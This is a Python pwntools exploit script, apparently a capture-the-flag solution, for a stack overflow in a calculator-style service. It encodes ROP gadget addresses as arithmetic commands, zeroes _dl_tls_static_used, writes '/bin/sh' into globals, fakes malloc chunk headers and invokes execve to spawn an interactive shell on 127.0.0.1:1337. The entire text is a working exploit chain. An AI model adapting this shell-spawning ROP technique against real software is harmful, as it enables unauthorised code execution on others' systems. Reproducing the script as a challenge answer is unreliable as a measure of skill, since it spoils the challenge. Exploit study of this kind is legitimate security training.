import struct

def write_addr(addr):
    return ADD + str(addr-40) + "\n" + "40\n" + NULL

# Commands
ADD = "1\n"
SUB = "2\n"
MUL = "3\n"
DIV = "4\n"
DONE = "5\n"
NULL = SUB+"40\n"+"40\n"
# Gadgets
POP_RDI = write_addr(0x00401b73)
POP_RAX = write_addr(0x0044db34)
POP_RDX = write_addr(0x00437a85)
POP_RSI = write_addr(0x00401c87)
MOV_EDX_TO_AT_RAX = write_addr(0x0044526f)
SYSCALL = write_addr(0x004648e5)
# Globals
addX = 0x6C4A80
addY = addX + 4
addRes = addY + 4
divX = addRes + 8
divY = divX + 4
divRes = divY + 4
mulX = divRes + 8
mulY = mulX + 4
mulRes = mulY + 4
subX = mulRes + 8
subY = subX + 4
subRes = subY + 4
_dl_tls_static_used = 0x6C4AC0

# Build commands
commands = [
    "100\n",  # Any large number
    write_addr(addX+16)*9,  # Fill stack with address of divX. This will wipe it out :(
    # Set _dl_tls_static_used to 0
    POP_RAX,
    write_addr(_dl_tls_static_used),
    POP_RDX,
    NULL, NULL,
    MOV_EDX_TO_AT_RAX,
    # Put "/bin/sh" at divX using ROP
    POP_RAX,
    write_addr(divX),
    POP_RDX,
    write_addr(struct.unpack("<I", b"/bin")[0]),
    MOV_EDX_TO_AT_RAX,
    POP_RAX,
    write_addr(divY),
    POP_RDX,
    write_addr(struct.unpack("<I", b"/sh\x00")[0]),
    MOV_EDX_TO_AT_RAX,
    # Now get ready for syscall
    POP_RDI,
    write_addr(divX),  # divX holds the string "/bin/sh"
    POP_RAX,
    SUB + str(0x3b + 0x1000) + "\n" + "4096\n" + NULL,  # 0x3b = execve
    POP_RDX,
    NULL, NULL,  # RDX should be null
    POP_RSI,  # RSI should point to an array that has a pointer to "/bin/sh" and a null pointer
    write_addr(subY),
    SYSCALL,
    # Now we need to populate the global vars by running extra calcs
    # -- Put pointer to divX at subY with null after
    SUB + str(divX) + "\n" + str(divX) + "\n",
    # Now we need to put two malloc blocks in add and mul
    # The first 8 bytes (x and y) don't matter, it's the result that does
    ADD + "-123\n" + "156\n",  # sum is 0x21
    MUL + "41\n" + "41\n",  # product is odd
    DONE
]

from pwn import *

r = remote("127.0.0.1", 1337)
garbage = r.recv()
r.send("".join(commands))
r.interactive()
